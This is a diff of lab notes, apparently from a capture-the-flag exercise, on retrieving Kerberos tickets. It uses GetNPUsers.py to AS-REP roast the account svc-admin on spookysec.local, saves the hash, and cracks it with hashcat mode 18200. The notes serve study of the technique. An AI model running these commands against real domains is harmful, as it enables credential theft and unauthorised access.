@@ -58,10 +58,8 @@ Retrieving Kerberos Tickets
                         previously via Kerbrute.
 GetNPuser.py
                         1- "GetNPUsers.py  -h"
-                        2- execute a command 
-                            "GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin"
-                        3- Save hash and copy to file
-                            "python3 GetNPUsers.py spookysec.local/svc-admin -no-pass | tee ~/Downloads/hash.txt"
+                        2- execute a command & and copy to file
+                            "GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin | tee ~/Downloads/hash.txt"
 HASHCAT
             1-  "hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
